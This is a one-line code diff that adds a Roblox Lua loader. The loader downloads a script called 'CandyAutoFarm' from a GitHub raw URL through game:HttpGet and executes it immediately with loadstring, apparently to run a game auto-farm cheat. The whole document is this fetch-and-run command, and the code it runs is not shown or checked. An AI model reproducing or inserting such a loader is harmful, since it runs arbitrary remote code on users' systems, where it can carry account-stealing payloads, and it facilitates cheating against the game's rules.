@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FishyPlayzThis/CandyAutoFarm/refs/heads/main/main.lua",true))()
